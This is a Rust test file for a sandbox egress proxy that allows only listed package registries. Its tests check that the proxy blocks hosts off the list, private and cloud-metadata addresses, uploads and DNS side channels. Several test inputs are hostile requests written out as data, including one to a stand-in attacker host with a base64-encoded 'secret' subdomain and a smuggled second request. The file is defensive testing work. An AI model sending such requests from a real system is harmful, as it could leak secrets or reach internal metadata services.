// SPDX-License-Identifier: GPL-3.0-or-later
//! The proxy against mock upstream servers on loopback. Names are resolved by
//! a fixed map, so `registry.test` can lead to a loopback server (exempt from
//! the private-address rule for these tests only).

use super::*;
use futures_util::future::BoxFuture;
use std::collections::HashMap;
use std::sync::atomic::AtomicUsize;
use tokio::io::DuplexStream;
use tokio::net::TcpListener;

/// Resolves names from a map; counts lookups.
struct Map {
    names: HashMap<String, Vec<IpAddr>>,
    lookups: AtomicUsize,
}

impl Resolve for Map {
    fn resolve(
        &self,
        host: String,
        port: u16,
    ) -> BoxFuture<'static, std::io::Result<Vec<SocketAddr>>> {
        self.lookups.fetch_add(1, Ordering::Relaxed);
        let found = self.names.get(&host).cloned();
        Box::pin(async move {
            found
                .map(|ips| {
                    ips.into_iter()
                        .map(|ip| SocketAddr::new(ip, port))
                        .collect()
                })
                .ok_or_else(|| std::io::Error::other("no such name"))
        })
    }
}

struct Setup {
    proxy: Proxy,
    events: Arc<Mutex<Vec<Event>>>,
    resolver: Arc<Map>,
    port: u16,
    /// What the upstream received, per connection.
    received: Arc<Mutex<Vec<Vec<u8>>>>,
}

const LOOPBACK: IpAddr = IpAddr::V4(Ipv4Addr::LOCALHOST);

/// A proxy allowing `registry.test` (and `internal.test`, `meta.test`) at a
/// loopback upstream that records what it gets and answers `reply`.
async fn setup(reply: &'static [u8]) -> Setup {
    let upstream = TcpListener::bind((LOOPBACK, 0)).await.unwrap();
    let port = upstream.local_addr().unwrap().port();
    let received = Arc::new(Mutex::new(Vec::new()));
    let log = received.clone();
    tokio::spawn(async move {
        while let Ok((mut s, _)) = upstream.accept().await {
            let log = log.clone();
            tokio::spawn(async move {
                let mut got = Vec::new();
                let mut buf = [0u8; 4096];
                // Reply once the first bytes arrived, then keep reading.
                let mut replied = false;
                loop {
                    match tokio::time::timeout(Duration::from_millis(300), s.read(&mut buf)).await {
                        Ok(Ok(0)) | Ok(Err(_)) => break,
                        Ok(Ok(n)) => got.extend_from_slice(&buf[..n]),
                        Err(_) if !got.is_empty() => break,
                        Err(_) => continue,
                    }
                    if !replied {
                        replied = true;
                        let _ = s.write_all(reply).await;
                    }
                }
                let _ = s.shutdown().await;
                log.lock().unwrap().push(got);
            });
        }
    });
    let resolver = Arc::new(Map {
        names: HashMap::from([
            ("registry.test".to_owned(), vec![LOOPBACK]),
            (
                "internal.test".to_owned(),
                vec!["10.0.0.5".parse().unwrap()],
            ),
            (
                "mixed.test".to_owned(),
                vec![LOOPBACK, "10.0.0.5".parse().unwrap()],
            ),
            (
                "meta.test".to_owned(),
                vec!["169.254.169.254".parse().unwrap()],
            ),
        ]),
        lookups: AtomicUsize::new(0),
    });
    let hosts = Hosts::parse(&[
        format!("registry.test:{port}"),
        "registry.test".into(),
        format!("internal.test:{port}"),
        format!("mixed.test:{port}"),
        format!("meta.test:{port}"),
        format!("nowhere.test:{port}"),
    ])
    .unwrap();
    let mut rules = Rules::new(hosts);
    rules.exempt = exempt(&[LOOPBACK, "169.254.169.254".parse().unwrap()]);
    let events = Arc::new(Mutex::new(Vec::new()));
    let sink_events = events.clone();
    let sink: Sink = Arc::new(move |e| sink_events.lock().unwrap().push(e));
    Setup {
        proxy: Proxy::new(rules, resolver.clone(), sink, open()),
        events,
        resolver,
        port,
        received,
    }
}

/// Serves `request` (then `after`, once the proxy answered) through the
/// proxy; returns what the client got back.
async fn exchange(s: &Setup, request: &[u8], after: &[u8]) -> (String, Arc<Refusals>) {
    let refusals = Arc::new(Refusals::default());
    let (mut client, server): (DuplexStream, DuplexStream) = tokio::io::duplex(64 * 1024);
    let (proxy, log) = (s.proxy.clone(), refusals.clone());
    let served = tokio::spawn(async move { proxy.serve(server, &log).await });
    client.write_all(request).await.unwrap();
    let mut got = Vec::new();
    let mut buf = [0u8; 4096];
    let mut sent_after = false;
    loop {
        match tokio::time::timeout(Duration::from_secs(3), client.read(&mut buf)).await {
            Ok(Ok(0)) | Ok(Err(_)) | Err(_) => break,
            Ok(Ok(n)) => got.extend_from_slice(&buf[..n]),
        }
        if !sent_after && !after.is_empty() && got.windows(4).any(|w| w == b"\r\n\r\n") {
            sent_after = true;
            client.write_all(after).await.unwrap();
            client.shutdown().await.unwrap();
        }
    }
    drop(client);
    let _ = tokio::time::timeout(Duration::from_secs(5), served).await;
    (String::from_utf8_lossy(&got).into_owned(), refusals)
}

fn events(s: &Setup) -> Vec<Event> {
    s.events.lock().unwrap().clone()
}

#[tokio::test]
async fn a_tunnel_to_an_allowed_host_carries_its_tls_session() {
    let s = setup(b"server-bytes").await;
    let hello = tls::sample_hello(Some("registry.test"));
    let mut after = hello.clone();
    after.extend_from_slice(b"client-bytes");
    let request = format!(
        "CONNECT registry.test:{} HTTP/1.1\r\nHost: x\r\n\r\n",
        s.port
    );
    let (got, refusals) = exchange(&s, request.as_bytes(), &after).await;
    assert!(
        got.starts_with("HTTP/1.1 200 Connection established\r\n\r\n"),
        "{got}"
    );
    assert!(got.ends_with("server-bytes"), "{got}");
    assert!(refusals.0.lock().unwrap().is_empty());
    let received = s.received.lock().unwrap().clone();
    assert_eq!(received, vec![after.clone()]);
    let e = events(&s);
    assert_eq!(e.len(), 1, "{e:?}");
    assert_eq!(
        (e[0].host.as_str(), e[0].port, e[0].outcome),
        ("registry.test", s.port, Outcome::Allowed)
    );
    assert_eq!(e[0].bytes_up, after.len() as u64);
    assert_eq!(e[0].bytes_down, b"server-bytes".len() as u64);
}

#[tokio::test]
async fn a_tunnel_must_carry_tls_for_its_own_host() {
    let s = setup(b"server-bytes").await;
    let request = format!("CONNECT registry.test:{} HTTP/1.1\r\n\r\n", s.port);
    for (after, why) in [
        (tls::sample_hello(Some("attacker.example")), "another host"),
        (tls::sample_hello(None), "only TLS"),
        (
            b"GET / HTTP/1.1\r\nHost: attacker.example\r\n\r\n".to_vec(),
            "only TLS",
        ),
    ] {
        let (got, refusals) = exchange(&s, request.as_bytes(), &after).await;
        assert!(!got.contains("server-bytes"), "{got}");
        assert!(
            refusals.0.lock().unwrap()[0].contains(why),
            "{:?}",
            refusals.0
        );
    }
    // A tunnel the client opens and closes unused is not a refusal.
    let (got, refusals) = exchange(&s, request.as_bytes(), b"").await;
    assert!(got.starts_with("HTTP/1.1 200"), "{got}");
    assert!(refusals.0.lock().unwrap().is_empty());
    assert_eq!(events(&s).last().unwrap().outcome, Outcome::Failed);
    // The upstream never saw a byte of the refused sessions.
    assert!(s.received.lock().unwrap().iter().all(Vec::is_empty));
    let e = events(&s);
    assert!(
        e[..3]
            .iter()
            .all(|e| e.outcome == Outcome::Refused && e.bytes_up == 0),
        "{e:?}"
    );
}

#[tokio::test]
async fn hosts_off_the_list_are_refused_without_a_lookup() {
    let s = setup(b"x").await;
    for request in [
        "CONNECT attacker.example:443 HTTP/1.1\r\n\r\n".to_owned(),
        // A listed host on a port it is not listed with.
        "CONNECT registry.test:22 HTTP/1.1\r\n\r\n".to_owned(),
        // Addresses are never listed.
        format!("CONNECT 127.0.0.1:{} HTTP/1.1\r\n\r\n", s.port),
        "GET http://c2VjcmV0.attacker.example/x HTTP/1.1\r\n\r\n".to_owned(),
    ] {
        let (got, _) = exchange(&s, request.as_bytes(), b"").await;
        assert!(
            got.starts_with("HTTP/1.1 403 Forbidden"),
            "{request}: {got}"
        );
        assert!(
            got.contains("sandbox.registries") || got.contains("not a host name"),
            "{got}"
        );
    }
    // A name that is not allowed is never resolved (no DNS side channel).
    assert_eq!(s.resolver.lookups.load(Ordering::Relaxed), 0);
    assert!(s.received.lock().unwrap().is_empty());
    let e = events(&s);
    assert_eq!(e.len(), 4);
    assert!(e.iter().all(|e| e.outcome == Outcome::Refused));
    assert_eq!(e[0].host, "attacker.example");
    assert_eq!(e[2].host, "", "an address is not recorded as a host");
}

#[tokio::test]
async fn private_and_metadata_addresses_are_refused_even_for_listed_hosts() {
    let s = setup(b"x").await;
    for (host, why) in [
        ("internal.test", "a private address"),
        ("mixed.test", "a private address"),
        // Exempt in these tests, and still refused.
        ("meta.test", "a cloud metadata address"),
    ] {
        let request = format!("CONNECT {host}:{} HTTP/1.1\r\n\r\n", s.port);
        let (got, refusals) = exchange(&s, request.as_bytes(), b"").await;
        assert!(got.starts_with("HTTP/1.1 403"), "{host}: {got}");
        assert!(got.contains(why), "{host}: {got}");
        assert!(refusals.0.lock().unwrap()[0].starts_with(host));
    }
    assert!(s.received.lock().unwrap().is_empty());
    // Loopback without the tests' exemption is refused too.
    let mut rules = Rules::new(Hosts::parse(&[format!("registry.test:{}", s.port)]).unwrap());
    rules.exempt = guard::Allowlist::default();
    let strict = Setup {
        proxy: Proxy::new(rules, s.resolver.clone(), Arc::new(|_| {}), open()),
        ..setup(b"x").await
    };
    let request = format!("CONNECT registry.test:{} HTTP/1.1\r\n\r\n", s.port);
    let (got, _) = exchange(&strict, request.as_bytes(), b"").await;
    assert!(got.contains("a loopback address"), "{got}");
    for name in ["metadata.google.internal", "169.254.169.254"] {
        let request = format!("CONNECT {name}:80 HTTP/1.1\r\n\r\n");
        let (got, _) = exchange(&s, request.as_bytes(), b"").await;
        assert!(got.starts_with("HTTP/1.1 403"), "{got}");
    }
}

const REPLY: &[u8] = b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello";

#[tokio::test]
async fn plain_http_sends_one_read_request_with_its_own_host() {
    let s = setup(REPLY).await;
    let request = format!(
        "GET http://registry.test:{}/pkg/secret-path-4242?token=9999 HTTP/1.1\r\n\
         Host: attacker.example\r\nProxy-Authorization: Basic eDp5\r\nAccept: */*\r\n\r\n\
         GET http://attacker.example/next HTTP/1.1\r\n\r\n",
        s.port
    );
    let (got, _) = exchange(&s, request.as_bytes(), b"").await;
    assert!(got.ends_with("hello"), "{got}");
    let received = s.received.lock().unwrap().clone();
    let sent = String::from_utf8_lossy(&received[0]).into_owned();
    assert_eq!(
        sent,
        format!(
            "GET /pkg/secret-path-4242?token=9999 HTTP/1.1\r\nHost: registry.test:{}\r\n\
             Accept: */*\r\nConnection: close\r\n\r\n",
            s.port
        )
    );
    // Nothing of the path or query in the event.
    let e = events(&s);
    assert_eq!((e[0].outcome, e[0].port), (Outcome::Allowed, s.port));
    let text = format!("{e:?}");
    assert!(
        !text.contains("secret-path") && !text.contains("9999"),
        "{text}"
    );
    assert_eq!(e[0].bytes_up, received[0].len() as u64);
    assert_eq!(e[0].bytes_down, REPLY.len() as u64);
}

#[tokio::test]
async fn uploads_and_malformed_requests_are_refused() {
    let s = setup(b"x").await;
    for (request, status) in [
        (
            format!(
                "POST http://registry.test:{}/upload HTTP/1.1\r\nContent-Length: 4\r\n\r\ndata",
                s.port
            ),
            "405",
        ),
        ("BREW / HTCPCP/1.0\r\n\r\n".to_owned(), "400"),
        (
            "GET /x HTTP/1.1\r\nHost: registry.test\r\n\r\n".to_owned(),
            "400",
        ),
    ] {
        let (got, refusals) = exchange(&s, request.as_bytes(), b"").await;
        assert!(got.starts_with(&format!("HTTP/1.1 {status}")), "{got}");
        assert_eq!(refusals.0.lock().unwrap().len(), 1);
    }
    assert!(s.received.lock().unwrap().is_empty());
    let e = events(&s);
    assert_eq!(e[0].host, "registry.test", "{e:?}");
    // A client that connects and leaves without a word leaves no event.
    let (client, server) = tokio::io::duplex(1024);
    drop(client);
    s.proxy.serve(server, &Refusals::default()).await;
    assert_eq!(events(&s).len(), 3);
}

#[tokio::test]
async fn an_unreachable_listed_host_fails_without_counting_as_allowed() {
    let s = setup(b"x").await;
    let request = format!("CONNECT nowhere.test:{} HTTP/1.1\r\n\r\n", s.port);
    let (got, refusals) = exchange(&s, request.as_bytes(), b"").await;
    assert!(got.starts_with("HTTP/1.1 502"), "{got}");
    assert!(refusals.0.lock().unwrap().is_empty());
    let e = events(&s);
    assert_eq!(e[0].outcome, Outcome::Failed);
    assert!(e[0].reason.contains("resolve"), "{e:?}");
}

#[tokio::test]
async fn a_route_listens_until_it_is_dropped() {
    let s = setup(b"server-bytes").await;
    let route = s.proxy.route(SandboxKind::Seatbelt, &[]).await.unwrap();
    let ProxyRoute::Loopback { port } = route.network else {
        panic!()
    };
    let mut c = tokio::net::TcpStream::connect((LOOPBACK, port))
        .await
        .unwrap();
    c.write_all(b"CONNECT attacker.example:443 HTTP/1.1\r\n\r\n")
        .await
        .unwrap();
    let mut got = String::new();
    c.read_to_string(&mut got).await.unwrap();
    assert!(got.starts_with("HTTP/1.1 403"), "{got}");
    assert_eq!(
        route.refused(),
        [
            "attacker.example:443 (not an allowed package registry (the operator can add it to sandbox.registries))"
        ]
    );
    drop(route);
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert!(
        tokio::net::TcpStream::connect((LOOPBACK, port))
            .await
            .is_err()
    );
    // Bubblewrap routes need the helper.
    assert!(s.proxy.route(SandboxKind::Bubblewrap, &[]).await.is_err());
}

/// The check of a run without the boundary: everything passes it.
fn open() -> declass_boundary::third_party::Guard {
    use declass_boundary::view::Presenter;
    declass_boundary::view::PassThrough { max_bytes: 0 }.outbound_guard()
}
